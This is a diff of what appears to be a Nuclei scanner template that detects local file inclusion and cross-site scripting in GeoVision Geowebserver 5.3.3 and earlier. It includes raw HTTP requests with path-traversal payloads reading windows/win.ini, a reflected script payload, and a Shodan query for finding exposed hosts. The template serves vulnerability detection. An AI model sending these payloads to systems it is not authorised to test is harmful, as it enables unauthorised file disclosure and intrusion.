@@ -1,5 +1,4 @@
 id: geovision-geowebserver-lfi-xss
-
 info:
   name: GeoVision Geowebserver <= 5.3.3 - Local File Inclusion / Cross-Site Scripting
   author: shamo0
@@ -9,14 +8,32 @@ info:
   reference:
     - https://www.geovision.com.tw/cyber_security.php
     - https://www.exploit-db.com/exploits/50211
+  classification:
+    cwe-id:
+      - CWE-80
   metadata:
-    verified: true
     max-request: 3
     shodan-query: title:"Geowebserver"
-  tags: geovision,geowebserver,lfi,xss,vuln
-
+    verified: true
+  tags: geovision,geowebserver,lfi,vuln,xss
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        dsl:
+          - contains_all(body, "for 16-bit", "[fonts]", "[extensions]")
+          - contains(content_type, "application/octet-stream")
+          - status_code == 200
+        name: lfi
+        type: dsl
+      - condition: and
+        dsl:
+          - contains_all(body, "<script>alert(document.domain)</script>={\"AeDebug")
+          - contains(content_type, "text/html")
+          - status_code == 200
+        name: xss
+        type: dsl
+    matchers-condition: or
+    raw:
       - |
         GET /Visitor/bin/WebStrings.srf?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&obj_name=<script>alert(document.domain)</script> HTTP/1.1
         Host: {{Hostname}}
@@ -27,22 +44,3 @@ http:
       - |
         GET /Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows\win.ini HTTP/1.1
         Host: {{Hostname}}
-
-    matchers-condition: or
-    matchers:
-      - type: dsl
-        name: lfi
-        dsl:
-          - 'contains_all(body, "for 16-bit", "[fonts]", "[extensions]")'
-          - 'contains(content_type, "application/octet-stream")'
-          - 'status_code == 200'
-        condition: and
-
-      - type: dsl
-        name: xss
-        dsl:
-          - 'contains_all(body, "<script>alert(document.domain)</script>={\"AeDebug")'
-          - 'contains(content_type, "text/html")'
-          - 'status_code == 200'
-        condition: and
-
